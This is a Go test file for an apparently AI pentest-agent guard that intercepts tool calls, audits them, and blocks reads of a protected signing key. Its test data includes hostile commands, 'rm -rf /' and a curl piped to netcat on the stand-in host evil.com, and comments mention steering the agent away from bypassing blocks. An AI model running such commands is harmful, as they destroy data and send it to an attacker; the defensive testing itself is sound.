package guard

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/Autumn-27/artex/pathguard"
	"github.com/Autumn-27/norma/hook"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// audit still records every gated call
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

// TestSystemBlockMessagePreservedIsBrainInput pins the platform-governance framing
// (systemBlockMessage) to its original Chinese bytes. That framing is the model-facing
// tool_result that steers the pentest agent away from bypassing an intercept block
// (see guard.go doc comment + the F14 보존 판단). For the ask-block paths the same
// framed string also lands in the /api/audit record via g.record, so one string serves
// both the agent input and the audit display — it must NOT be translated, or benchmarked
// agent behavior could drift. This test fails if the framing is accidentally localized.
func TestSystemBlockMessagePreservedIsBrainInput(t *testing.T) {
	got := systemBlockMessage("<原因>")
	want := "【ARTEX 平台管控·非目标防御】此调用被平台拦截。原因：<原因>。此操作被禁止。"
	if got != want {
		t.Errorf("systemBlockMessage framing drifted (F14 두뇌 보존 — 원문 유지해야 함):\n got %q\nwant %q", got, want)
	}
}

var _ = hook.PreToolUse

// TestPreToolUseBlocksPlatformSecretPath verifies the file-tool secret guard
// fires from the hook, ahead of any intercept rule (no interceptor is wired here,
// so nothing but pathguard can be responsible for the block).
func TestPreToolUseBlocksPlatformSecretPath(t *testing.T) {
	dir := t.TempDir()
	key := filepath.Join(dir, "jwt.key")
	if err := os.WriteFile(key, []byte("k"), 0o600); err != nil {
		t.Fatal(err)
	}
	pathguard.Reset()
	pathguard.Protect(key)
	t.Cleanup(pathguard.Reset)

	g := New()
	in, _ := json.Marshal(map[string]string{"file_path": key})
	res := g.preToolUse(context.Background(), hook.Event{ToolName: "Read", Input: in})
	if res.Decision != "block" {
		t.Fatalf("Read of the signing key: decision %q, want block", res.Decision)
	}
	other, _ := json.Marshal(map[string]string{"file_path": filepath.Join(dir, "notes.txt")})
	if res := g.preToolUse(context.Background(), hook.Event{ToolName: "Read", Input: other}); res.Decision == "block" {
		t.Fatal("an ordinary path was blocked")
	}
}
